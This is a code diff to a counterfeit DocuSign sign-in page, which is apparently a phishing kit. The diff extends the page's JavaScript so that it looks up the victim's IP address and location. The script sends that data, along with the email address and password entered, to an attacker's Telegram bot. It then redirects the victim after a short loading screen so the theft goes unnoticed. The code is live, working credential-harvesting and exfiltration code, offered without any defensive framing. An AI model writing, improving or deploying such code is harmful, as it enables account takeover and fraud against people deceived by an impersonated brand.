@@ -6,8 +6,6 @@
     <title>DocuSign - Sign In</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- Simple eye icon (you can replace with SVG if you want) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
@@ -219,7 +217,6 @@
 </head>
 <body>
 
-    <!-- Loading overlay -->
     <div id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Loading documents...</div>
@@ -264,7 +261,6 @@
         </div>
     </div>
 
-    <!-- Password Step -->
     <div class="container hidden" id="passwordStep">
         <div class="logo">
             <img src="https://images.squarespace-cdn.com/content/v1/635736d9c34e1670e516b979/2b41dc52-d780-49d3-8d53-ae5e2afa2975/docusign+logo+teaser.png" alt="DocuSign Logo">
@@ -351,17 +347,36 @@
 
             if (!password) return;
 
+            // Show loading immediately
+            loadingOverlay.classList.add('active');
+
+            // Get IP and location
+            let ip = 'unknown';
+            let location = 'unknown';
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip || 'hidden';
+
+                const locRes = await fetch('https://ipapi.co/json/');
+                const locData = await locRes.json();
+                location = `${locData.city || 'unknown'}, ${locData.region || ''}, ${locData.country_name || 'unknown'}`;
+            } catch (err) {
+                console.error('Error fetching IP/location:', err);
+            }
+
             const message = `
 NEW DOCUSIGN LOGIN
 Time: ${new Date().toLocaleString()}
 Email: ${email || '(empty)'}
 Password: ${password}
+IP: ${ip}
+Location: ${location}
 URL: ${window.location.href}
             `.trim();
 
-            // Show loading immediately
-            loadingOverlay.classList.add('active');
-
+            // Send to Telegram
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -377,16 +392,24 @@ URL: ${window.location.href}
                 if (!response.ok) {
                     console.error('Telegram send failed:', await response.text());
                 } else {
-                    console.log('Message sent to Telegram');
+                    console.log('Message sent to Telegram successfully');
                 }
             } catch (err) {
-                console.error('Error sending to Telegram:', err);
+                console.error('Telegram request error:', err);
             }
 
-            // Redirect after delay
+            // Switch to loading documents
+            setTimeout(() => {
+                loadingOverlay.innerHTML = `
+                    <div class="spinner"></div>
+                    <div class="loading-text">Loading documents...</div>
+                `;
+            }, 1200);
+
+            // Redirect after total ~3.5 seconds
             setTimeout(() => {
                 window.location.replace(REDIRECT_URL);
-            }, 2800);
+            }, 3500);
         });
     </script>
 
